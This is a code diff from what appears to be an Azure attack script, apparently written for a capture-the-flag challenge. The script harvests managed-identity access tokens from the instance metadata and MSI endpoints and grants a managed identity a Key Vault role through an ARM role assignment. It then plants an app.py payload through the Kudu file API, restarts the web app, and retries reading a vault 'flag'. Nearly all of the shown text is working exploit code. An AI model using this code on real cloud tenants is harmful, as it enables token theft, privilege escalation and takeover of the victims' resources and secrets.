@@ -154,7 +154,7 @@ def emit(x):
 def token(resource):
     env = os.environ
     eps = []
-    for ep in (env.get("IDENTITY_ENDPOINT"), env.get("MSI_ENDPOINT"), "http://127.0.0.1:8081/msi/token", "http://169.254.131.3:8081/msi/token", "http://169.254.130.3:8081/msi/token"):
+    for ep in (env.get("IDENTITY_ENDPOINT"), env.get("MSI_ENDPOINT"), "http://127.0.0.1:8081/msi/token", "http://169.254.131.3:8081/msi/token"):
         if ep and ep not in eps: eps.append(ep)
     hdr = {}
     if env.get("IDENTITY_HEADER"): hdr["X-IDENTITY-HEADER"] = env["IDENTITY_HEADER"]
@@ -164,7 +164,7 @@ def token(resource):
         for extra in ("&client_id="+urllib.parse.quote(MICLIENT), "&mi_res_id="+urllib.parse.quote(MIRES, safe=""), ""):
             u = ep + "?resource=" + urllib.parse.quote(resource, safe="") + "&api-version=2019-08-01" + extra
             try:
-                d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers=hdr), timeout=5).read().decode())
+                d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers=hdr), timeout=2).read().decode())
                 if d.get("access_token"):
                     emit({"stage":"app-identity-token","resource":resource,"endpoint":ep,"env_endpoint":env.get("IDENTITY_ENDPOINT"),"has_header":bool(env.get("IDENTITY_HEADER"))})
                     return d["access_token"]
@@ -172,7 +172,7 @@ def token(resource):
             except Exception as e: errs.append(repr(e))
     for u in ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource, safe="")+"&client_id="+MICLIENT,):
         try:
-            d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers={"Metadata":"true"}), timeout=5).read().decode())
+            d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers={"Metadata":"true"}), timeout=2).read().decode())
             if d.get("access_token"): return d["access_token"]
         except Exception as e: errs.append(repr(e))
     raise RuntimeError("app identity failed: " + " | ".join(errs[-8:]))
@@ -198,14 +198,14 @@ def run():
         body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":MIPRINCIPAL,"principalType":"ServicePrincipal"}}
         emit({"stage":"app-role-assignment","response":arm_put(ra,body,at)})
         last=None
-        for i in range(20):
+        for i in range(8):
             try:
                 res=read_flag(token("https://vault.azure.net"))
                 emit({"stage":"app-flag","attempt":i+1,"response":res})
                 if res.get("status")==200: return
                 last=res
             except Exception as e: last=repr(e)
-            time.sleep(4)
+            time.sleep(3)
         emit({"stage":"app-flag-error","last":last})
     except Exception as e: emit({"stage":"app-error","error":repr(e),"trace":traceback.format_exc()})
 try:
@@ -217,7 +217,8 @@ app=Flask(__name__)
 @app.route("/<path:path>")
 def catch(path): return jsonify(status="ok", path=path)
 '''
-outer_emit({"stage":"app-write", "response":kudu_put("/api/vfs/site/wwwroot/app.py", app_payload.encode())})
+outer_emit({"stage":"app-before-write", "bytes":len(app_payload)})
+outer_emit({"stage":"app-write", "response":kudu_put("/api/vfs/site/wwwroot/app.py", app_payload.encode(), timeout=8)})
 try:
     rr = urllib.request.urlopen(urllib.request.Request(restart_url, data=b"", method="POST", headers={"Authorization":"Bearer "+arm}), timeout=30)
     outer_emit({"stage":"app-restart-after-write", "status":rr.status})
